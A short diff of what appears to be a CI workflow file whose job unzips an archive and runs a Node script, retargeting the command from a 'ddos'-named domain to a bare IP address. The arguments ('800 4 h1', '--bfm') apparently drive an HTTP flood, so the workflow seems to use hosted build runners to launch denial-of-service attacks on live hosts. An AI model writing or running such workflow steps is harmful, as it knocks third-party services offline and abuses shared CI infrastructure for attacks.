@@ -36,7 +36,7 @@ jobs:
           chmod +x ki
           unzip Fc-main.zip 
           cd Fc-main
-          node y.js GET https://gyrange-ddos.duckdns.org/ 800 4 90  --bfm --debug
+          node h.js http://52.66.255.34 800 4 h1
 
           
 
